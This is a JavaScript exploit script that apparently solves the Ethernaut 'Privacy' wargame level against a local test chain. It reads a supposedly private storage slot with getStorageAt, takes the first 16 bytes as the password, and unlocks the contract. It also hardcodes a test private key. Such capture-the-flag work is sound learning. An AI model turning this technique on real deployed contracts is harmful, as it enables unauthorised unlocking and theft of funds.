// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const privacy = require('./build/contracts/Privacy.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();

  // Address needs to be read from the console output of truffle migrate and
  // then entered here.
  const privacyAddress = '0x48efd6281127a418325cd53694d573627f540097';
  const privacyContract = new web3.eth.Contract(privacy.abi, privacyAddress);

  let locked = await privacyContract.methods.locked().call({from: publicKey});
  console.log('Is contract locked?', locked);

  // Now we try to read with getStorageAt from the contract. The following
  // variables are present
  // bool public locked = true;
  // uint256 public constant ID = block.timestamp;
  // uint8 private flattening = 10;
  // uint8 private denomination = 255;
  // uint16 private awkwardness = uint16(now);
  // bytes32[3] private data;
  //
  // I don't know what getStorageAt does. Solidity seems to merge storage slots
  // (https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)
  // An OK explaination can be found here:
  // https://medium.com/coinmonks/ethernaut-privacy-problem-7106562caee2
  //
  // What I did here is I iterated over all storage slots until I found the
  // matching one, which is 3.
  let password = await web3.eth.getStorageAt(privacyAddress, 3);
  // Even though web3 seems to substring the input into bytes16, I'm trying to
  // do it myself here. 32 bytes + 0x (2) as characters.
  password = password.substring(0, 34);
  console.log('Pwning contract with password found in contract storage');
  await privacyContract.methods.unlock(password).send({from: publicKey});

  locked = await privacyContract.methods.locked().call({from: publicKey});
  console.log('Is contract locked?', locked);
})();
